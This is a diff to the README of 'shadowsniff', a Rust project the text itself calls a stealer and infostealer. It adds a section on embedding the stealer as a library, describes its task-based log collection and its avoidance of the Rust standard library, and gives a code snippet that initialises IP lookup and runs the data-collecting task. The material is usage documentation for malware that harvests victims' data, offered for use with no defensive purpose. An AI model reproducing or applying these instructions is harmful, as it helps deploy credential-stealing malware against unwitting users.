@@ -69,6 +69,37 @@ a small action that makes a big difference!
 
 Thanks for being part of the project ❤️
 
+## Use as a library
+This stealer is task-based.
+Each task can spawn subtasks, but the main task is `shadowsniff::SniffTask`, 
+which is responsible for collecting the entire log.
+
+There are also composite tasks that contain other tasks.
+When started, each task runs in its own thread.
+A composite task waits for all its subtasks to finish before it completes.
+
+The stealer **does not use the Rust standard library**.
+The `utils::path::Path` type used in `run` comes from the crate `utils`.
+
+Before calling `SniffTask::new().run(&base_path)`, you **must** call `ipinfo::init_ip_info()`, otherwise it won't work.
+```rust
+use utils::path::Path;
+use ipinfo::init_ip_info;
+use shadowsniff::SniffTask;
+
+fn main() {
+    if !init_ip_info() {
+        panic!("Failed to initialize IP info");
+    }
+
+    let base_path = Path::new("output");
+    
+    unsafe {
+        SniffTask::new().run(&base_path);
+    }
+}
+```
+
 ## Acknowledgments
 This project has been inspired by a variety of open-source infostealers available on GitHub.
 Many functions and critical paths were adapted from publicly available repositories.
